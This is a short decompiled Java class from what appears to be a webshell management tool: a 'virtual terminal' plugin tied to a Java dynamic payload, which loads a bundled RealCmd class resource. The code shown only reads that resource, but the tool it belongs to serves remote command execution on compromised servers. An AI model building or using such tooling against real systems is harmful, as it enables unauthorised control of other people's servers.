/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import core.annotation.PluginAnnotation;
import java.io.InputStream;
import shells.plugins.generic.RealCmd;
import util.Log;
import util.functions;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="RealCmd", DisplayName="\u865a\u62df\u7ec8\u7aef")
public class JRealCmd
extends RealCmd {
    private static final String CLASS_NAME = "plugin.RealCmd";

    @Override
    public byte[] readPlugin() {
        byte[] data = null;
        try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/RealCmd.classs");
            data = functions.readInputStream(inputStream);
            inputStream.close();
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }

    @Override
    public String getClassName() {
        return CLASS_NAME;
    }
}

